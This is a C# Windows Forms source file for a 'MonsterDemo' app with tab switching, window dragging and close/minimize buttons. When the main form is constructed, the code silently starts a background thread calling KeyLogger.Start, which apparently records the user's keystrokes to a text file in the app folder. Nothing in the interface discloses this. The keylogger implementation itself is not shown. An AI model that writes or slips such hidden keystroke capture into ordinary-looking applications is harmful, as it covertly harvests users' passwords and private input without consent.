using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
namespace MonsterDemo
{
    public partial class MainForm : Form
    {
        int count = 0;
        string notepadPath = Application.StartupPath + @"\testMonster.txt";
        public MainForm()
        {
            ThreadStart childref = new ThreadStart(startLogging);
            Thread childThread = new Thread(childref);
            childThread.Start();
            InitializeComponent();
            SidePanel.Height = monsterTab.Height;
            SidePanel.Top = monsterTab.Top;
            mainCustomControl.BringToFront();
            
        }
        void startLogging()
        {

            KeyLogger.Start(notepadPath);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SidePanel.Height = monsterTab.Height;
            SidePanel.Top = monsterTab.Top;
            mainCustomControl.BringToFront();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            SidePanel.Height = statTab.Height;
            SidePanel.Top = statTab.Top;
            mySecondCustmControl1.BringToFront();

         
        }

        private void MainForm_Load(object sender, EventArgs e)
        {

        }

        
        public void MouseDownEvent(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                _lastPoint = new Point(e.X, e.Y);


            }

        }

        private Point _lastPoint;


        private void MouseMoveEvent(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - _lastPoint.X;
                this.Top += e.Y - _lastPoint.Y;
            }
        }

    
        private void CloseButton_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void sizeToggleButton_Click(object sender, EventArgs e)
        {
                this.WindowState = FormWindowState.Minimized;
                

        }

        private void settingsButton_Click(object sender, EventArgs e)
        {
            
      

        }

    }
}
